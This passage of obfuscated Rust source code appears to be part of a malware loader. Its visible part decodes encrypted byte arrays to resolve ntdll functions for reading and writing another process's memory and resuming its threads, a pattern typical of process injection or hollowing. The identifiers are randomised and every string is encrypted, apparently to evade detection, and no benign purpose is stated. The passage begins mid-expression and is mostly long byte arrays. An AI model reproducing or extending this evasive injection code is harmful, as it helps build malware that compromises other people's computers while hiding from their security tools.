51 , 73 , 168 , 49 , 4 , 184 , 112 , 148 , 219 , 217 , 100 , 62 , 163 , 239 , 64 , 145 , 154 , 201 , 59 , 253 , 53 , 247 , 77 , 183 , 37 , 1 , 60 , 150 , 153 , 57 , 105 , 34 , 130 , 132 , 208 , 72 , 40 , 255 , 112 , 102 , 177 , 252 , 160 , 92 , 177 , 219 , 237 , 50 , 100 , 223 , 176 , 36 , 124 , 17 , 18 , 9 , 158 , 141 , 69 , 9 , 36 , 162 , 162 , 245 , 4 , 18 , 222 , 45 , 162 , 30 , 40 , 200 , 209 , 74 , 181 , 6 , 210 , 179 , 159 , 128 , 28] , 14504104559289u64) . as_ptr ()) ; let NtReadVirtualMemory = GetProcAddress (ntdll , decode_kyk_acacrzkhu (& [36 , 138 , 160 , 58 , 251 , 38 , 114 , 117 , 58 , 130 , 9 , 52 , 247 , 126 , 147 , 179 , 55 , 132 , 122 , 198 , 22 , 90 , 237 , 222 , 34 , 176 , 43 , 94 , 123 , 252 , 167 , 217 , 173 , 22 , 225 , 84 , 199 , 37 , 77 , 199 , 203 , 150 , 8 , 174 , 143 , 222 , 241 , 7 , 159 , 82 , 90 , 247 , 134 , 11 , 247 , 187 , 140 , 253 , 176 , 237 , 127 , 143 , 197 , 128 , 60 , 253 , 21 , 226 , 148 , 177 , 245 , 26 , 2 , 103 , 2 , 169 , 107 , 47 , 66 , 240 , 10 , 209 , 93 , 43 , 11 , 185 , 179 , 245 , 59 , 23 , 141 , 226 , 100 , 142 , 88 , 33 , 175 , 137 , 217 , 142 , 118 , 245 , 116 , 106 , 89 , 205 , 164 , 17 , 26 , 92 , 83 , 10 , 209 , 171 , 55 , 172 , 234 , 96 , 34 , 78 , 172 , 83 , 76 , 202 , 192 , 215 , 149 , 20 , 164 , 234 , 220 , 79 , 99 , 195 , 178 , 101 , 142 , 128 , 70 , 138 , 190 , 171 , 251 , 222 , 62 , 64 , 132 , 132 , 3 , 142 , 49 , 213 , 51 , 215 , 70 , 155 , 102 , 176 , 246 , 254 , 137 , 86 , 251 , 141 , 93 , 47 , 26 , 74 , 140 , 86 , 51 , 225 , 188 , 152 , 193 , 75 , 56 , 137 , 190 , 186 , 92 , 164 , 186 , 193 , 71 , 101 , 180 , 185 , 241 , 245 , 60 , 203 , 34 , 54 , 151 , 102 , 91 , 160 , 23 , 33 , 252 , 100 , 252 , 188 , 10 , 107 , 51 , 240 , 72 , 238 , 31 , 108 , 165 , 45 , 6 , 140 , 100 , 9 , 117 , 129 , 208 , 167 , 189 , 0 , 15 , 115 , 125 , 119 , 215 , 62 , 83 , 86 , 240 , 177 , 164 , 187 , 166 , 45 , 137 , 133 , 44 , 85 , 111 , 179 , 183 , 84 , 234 , 57 , 237 , 140 , 27 , 44 , 108 , 80 , 240 , 199] , & [146 , 118 , 210 , 174 , 128 , 8 , 152 , 187 , 98 , 136 , 141 , 77 , 236 , 212 , 225 , 19 , 120 , 195 , 162 , 239 , 200 , 175 , 44 , 37 , 56 , 24 , 194 , 16 , 232 , 175 , 204 , 37 , 205 , 174 , 20 , 238 , 225 , 17 , 45 , 94 , 33 , 36 , 110 , 27 , 92 , 215 , 227 , 246 , 105 , 115 , 164 , 181 , 242 , 32 , 200 , 215 , 94 , 218 , 20 , 110 , 217 , 80 , 79 , 168 , 165 , 98 , 150 , 154 , 20 , 47 , 153 , 248 , 64 , 16 , 56 , 50 , 221 , 70 , 30 , 130 , 254 , 127 , 44 , 44 , 23 , 178 , 156 , 222] , 89623082567583u64) . as_ptr ()) ; let NtWriteVirtualMemory = GetProcAddress (ntdll , decode_kyk_acacrzkhu (& [47 , 238 , 137 , 21 , 10 , 120 , 138 , 208 , 139 , 201 , 44 , 199 , 103 , 90 , 24 , 21 , 243 , 234 , 225 , 207 , 19 , 107 , 124 , 127 , 104 , 201 , 101 , 38 , 178 , 3 , 244 , 143 , 36 , 231 , 11 , 65 , 236 , 135 , 196 , 118 , 211 , 136 , 120 , 69 , 101 , 7 , 30 , 50 , 68 , 107 , 91 , 171 , 129 , 235 , 88 , 22 , 212 , 115 , 237 , 243 , 155 , 118 , 59 , 33 , 58 , 81 , 195 , 215 , 238 , 7 , 2 , 228 , 41 , 179 , 122 , 89 , 212 , 124 , 117 , 233 , 159 , 163 , 200 , 255 , 169 , 80 , 197 , 78 , 52 , 107 , 64 , 237 , 73 , 26 , 227 , 251 , 176 , 41 , 246 , 23 , 249 , 150 , 232 , 142 , 200 , 34 , 223 , 139 , 37 , 159 , 80 , 193 , 109 , 73 , 9 , 230 , 41 , 128 , 73 , 189 , 30 , 129 , 175 , 161 , 37 , 232 , 70 , 153 , 123 , 60 , 45 , 87 , 174 , 80 , 19 , 40 , 5 , 240 , 244 , 245 , 218 , 83 , 14 , 85 , 113 , 183 , 125 , 143 , 231 , 168 , 161 , 116 , 131 , 6 , 30 , 125 , 193 , 68 , 19 , 19 , 92 , 188 , 239 , 75 , 56 , 182 , 20 , 229 , 89 , 155 , 129 , 78 , 45 , 4 , 141 , 189 , 235 , 235 , 150 , 145 , 146 , 54 , 115 , 138 , 126 , 62 , 75 , 50 , 133 , 12 , 165 , 208 , 17 , 161 , 37 , 105 , 98 , 206 , 119 , 230 , 132 , 152 , 171 , 39 , 210 , 4 , 20 , 141 , 110 , 125 , 214 , 176 , 246 , 144 , 253 , 6 , 62 , 16 , 127 , 154 , 164 , 43 , 211 , 96 , 182 , 74 , 159 , 0 , 137 , 235 , 63 , 110 , 123 , 139 , 223 , 41 , 131 , 70 , 80 , 60 , 223 , 173 , 59 , 19 , 67 , 141 , 53 , 30 , 255 , 137 , 118 , 211 , 65 , 117 , 217 , 214] , & [190 , 177 , 220 , 94 , 163 , 248 , 232 , 47 , 153 , 107 , 14 , 74 , 6 , 65 , 84 , 188 , 57 , 9 , 210 , 60 , 83 , 80 , 155 , 221 , 191 , 49 , 168 , 140 , 196 , 87 , 30 , 233 , 124 , 96 , 255 , 50 , 150 , 63 , 115 , 70 , 180 , 204 , 115 , 215 , 63 , 50 , 84 , 39 , 37 , 139 , 223 , 111 , 141 , 255 , 240 , 55 , 200 , 63 , 247 , 86 , 34 , 189 , 223 , 159 , 141 , 100 , 12 , 36 , 95 , 79 , 31 , 139 , 7 , 172 , 231 , 50 , 235 , 118 , 164 , 52 , 122 , 87 , 32 , 4 , 253 , 246 , 124 , 167] , 101696235636782u64) . as_ptr ()) ; let NtResumeThread = GetProcAddress (ntdll , decode_kyk_acacrzkhu (& [145 , 149 , 232 , 110 , 132 , 9 , 245 , 10 , 105 , 142 , 241 , 17 , 187 , 132 , 38 , 205 , 243 , 189 , 10 , 246 , 254 , 211 , 24 , 83 , 95 , 70 , 219 , 2 , 94 , 202 , 91 , 116 , 108 , 128 , 107 , 45 , 78 , 11 , 27 , 36 , 171 , 148 , 138 , 191 , 166 , 16 , 130 , 62 , 1 , 137 , 93 , 250 , 32 , 17 , 241 , 84 , 54 , 197 , 233 , 71 , 60 , 142 , 36 , 62 , 90 , 125 , 111 , 144 , 240 , 245 , 188 , 2 , 69 , 46 , 174 , 202 , 72 , 50 , 231 , 136 , 47 , 199 , 198 , 197 , 6 , 193 , 65 , 148 , 122 , 80 , 201 , 145 , 186 , 240 , 129 , 180 , 121 , 109 , 82 , 252 , 0 , 45 , 241 , 71 , 93 , 114 , 140 , 206 , 4 , 62 , 115 , 142 , 194 , 99 , 35 , 5 , 133 , 134 , 204 , 149 , 215 , 34 , 1 , 220 , 52 , 23 , 218 , 18 , 44 , 251 , 255 , 38 , 127 , 6 , 64 , 190 , 57 , 88 , 163 , 221 , 247 , 97 , 194 , 220 , 32 , 255 , 165 , 215 , 162 , 107 , 222 , 9 , 44 , 95 , 74 , 96 , 8 , 200 , 17 , 159 , 218 , 18 , 134 , 143 , 118 , 143 , 14 , 31 , 221 , 85 , 59 , 163 , 39 , 69 , 109 , 32 , 111 , 70 , 175 , 62 , 192 , 45 , 92 , 148 , 27 , 84 , 114 , 52 , 196 , 209 , 194 , 59] , & [137 , 16 , 166 , 96 , 215 , 33 , 130 , 191 , 103 , 13 , 3 , 247 , 88 , 61 , 215 , 63 , 164 , 9 , 118 , 127 , 210 , 234 , 171 , 45 , 240 , 25 , 249 , 166 , 137 , 173 , 47 , 109 , 137 , 226 , 0 , 234 , 237 , 84 , 213 , 92 , 66 , 209 , 57 , 201 , 114 , 226 , 89 , 236 , 227 , 70 , 245 , 144 , 77 , 208 , 184 , 126 , 82 , 23 , 137 , 199 , 164 , 103 , 111 , 250 , 217 , 220 , 132 , 175 , 198 , 141 , 16 , 31 , 251 , 246 , 23 , 171 , 201 , 248 , 78 , 101 , 82 , 124 , 128 , 176 , 63 , 146 , 206 , 242] , 51488067945868u64) . as_ptr ()) ; if NtQueryInformationProcess . is_none () || NtClose . is_none () || NtReadVirtualMemory . is_none () || NtWriteVirtualMemory . is_none () || NtResumeThread . is_none () { return Err (decode_kyk_acacrzkhu (& [187 , 4 , 162 , 163 , 129 , 24 , 54 , 179 , 92 , 56 , 86 , 195 , 132 , 200 , 72 , 88 , 214 , 199 , 53 , 107 , 15 , 39 , 240 , 37 , 82 , 60 , 96 , 19 , 119 , 215 , 228 , 59 , 166 , 46 , 61 , 158 , 191 , 51 , 76 , 253 , 243 , 32 , 251 , 49 , 135 , 34 , 27 , 123 , 233 , 53 , 144 , 222 , 88 , 31 , 53 , 219 , 241 , 191 , 111 , 88 , 249 , 203 , 230 , 49 , 220 , 248 , 231 , 41 , 239 , 101 , 44 , 19 , 126 , 77 , 184 , 145 , 71 , 149 , 118 , 43 , 162 , 132 , 36 , 187 , 236 , 141 , 85 , 253 , 77 , 142 , 16 , 118 , 114 , 45 , 46 , 106 , 53 , 228 , 142 , 29 , 169 , 83 , 132 , 94 , 116 , 192 , 199 , 58 , 198 , 78 , 186 , 15 , 15 , 117 , 175 , 228 , 242 , 61 , 42 , 241 , 165 , 147 , 252 , 8 , 131 , 239 , 46 , 229 , 253 , 252 , 204 , 39 , 27 , 162 , 177 , 230 , 183 , 193 , 8 , 137 , 183 , 239 , 5 , 136 , 199 , 64 , 80 , 253 , 2 , 53 , 0 , 216 , 68 , 199 , 219 , 43 , 131 , 129 , 22 , 254 , 126 , 192 , 180 , 3 , 110 , 191 , 122 , 111 , 189 , 185 , 191 , 84 , 200 , 50 , 185 , 245 , 193 , 246 , 60 , 151 , 70 , 72 , 129 , 143 , 43 , 190 , 195 , 48 , 128 , 12 , 121 , 105 , 163 , 173 , 243 , 45 , 104 , 196 , 251 , 108 , 184 , 236 , 6 , 146 , 236 , 163 , 120 , 127 , 111 , 24 , 86 , 234 , 101 , 53 , 224 , 76 , 232 , 74 , 93 , 34 , 199 , 203 , 170 , 88 , 219 , 224 , 20 , 248 , 18 , 165 , 124 , 243 , 101 , 241 , 234 , 203 , 85 , 20 , 121 , 213 , 14 , 186 , 20 , 187 , 70 , 142 , 225 , 236 , 204 , 229 , 182 , 203 , 2 , 85 , 30 , 32 , 97 , 200 , 84 , 249 , 32 , 184 , 208 , 228 , 129 , 200 , 132 , 17 , 118 , 170 , 104 , 3 , 31 , 35 , 111 , 218 , 212 , 188 , 66 , 114 , 161 , 34 , 72 , 243 , 234 , 225 , 144 , 162 , 84 , 81 , 2 , 107 , 190 , 147 , 130 , 89 , 136 , 234 , 252 , 115 , 43 , 23 , 17 , 38 , 154 , 88 , 125 , 224 , 98 , 65 , 15 , 75 , 32 , 153 , 12 , 152 , 135 , 153 , 130 , 197 , 225 , 221 , 144 , 170 , 233 , 157 , 219 , 120 , 160 , 4 , 192 , 38 , 156 , 19 , 146 , 74 , 133 , 85 , 227 , 238 , 105 , 162 , 247 , 73 , 36 , 70 , 132 , 51 , 48 , 45 , 113 , 37 , 201 , 136 , 37 , 161 , 166 , 202 , 246 , 9 , 10 , 111 , 217 , 148 , 24 , 220 , 235 , 154 , 49 , 34 , 84 , 72 , 44 , 75 , 183 , 67 , 103 , 245 , 55 , 110 , 14 , 203 , 53 , 147 , 112 , 129 , 181 , 229 , 37 , 118 , 182 , 161 , 140 , 189 , 127 , 42 , 229 , 130 , 56 , 40 , 92 , 225 , 239 , 68 , 28 , 63 , 100 , 150 , 143 , 79 , 187 , 192 , 63 , 101 , 223 , 169 , 209 , 153 , 190 , 78 , 116 , 13 , 194 , 59 , 125 , 212 , 172 , 199 , 121 , 47 , 108 , 103 , 105 , 183 , 24 , 207 , 233 , 227 , 174 , 226 , 16 , 82 , 180 , 204 , 148 , 60 , 205 , 176 , 11 , 41 , 72 , 130 , 243 , 226 , 6 , 150 , 201 , 14 , 238 , 34 , 82 , 167 , 72 , 72 , 70 , 25 , 152 , 201 , 214 , 37 , 158 , 44 , 109 , 46 , 28 , 184 , 178 , 109 , 218 , 57 , 79 , 172 , 196 , 185 , 220 , 194 , 143 , 118 , 192 , 213 , 148 , 29 , 237 , 207 , 52 , 195 , 87 , 242 , 209 , 252 , 246 , 237 , 49 , 138 , 215 , 64 , 230 , 1 , 9 , 8 , 11 , 41] , & [152 , 157 , 155 , 251 , 229 , 232 , 196 , 140 , 78 , 167 , 240 , 92 , 123 , 222 , 19 , 151 , 246 , 41 , 159 , 133 , 69 , 35 , 22 , 56 , 84 , 229 , 243 , 173 , 9 , 145 , 75 , 159 , 39 , 184 , 163 , 186 , 82 , 109 , 204 , 127 , 225 , 201 , 235 , 74 , 21 , 58 , 92 , 29 , 136 , 7 , 218 , 161 , 195 , 105 , 185 , 176 , 5 , 167 , 44 , 104 , 245 , 229 , 98 , 31 , 202 , 64 , 147 , 87 , 35 , 101 , 136 , 26 , 50 , 248 , 119 , 155 , 248 , 1 , 151 , 76 , 224 , 25 , 106 , 9 , 149 , 44 , 137 , 109] , 107404247175235u64)) ; } Ok (Syscalls { NtQueryInformationProcess : transmute (NtQueryInformationProcess . unwrap ()) , NtClose : transmute (NtClose . unwrap ()) , NtReadVirtualMemory : transmute (NtReadVirtualMemory . unwrap ()) , NtWriteVirtualMemory : transmute (NtWriteVirtualMemory . unwrap ()) , NtResumeThread : transmute (NtResumeThread . unwrap ()) , }) } } } pub static dnw_ovait : Lazy < Syscalls > = Lazy :: new (| | { Syscalls :: new () . expect ("") }) ;
fn main() { q_mlmaupc(); }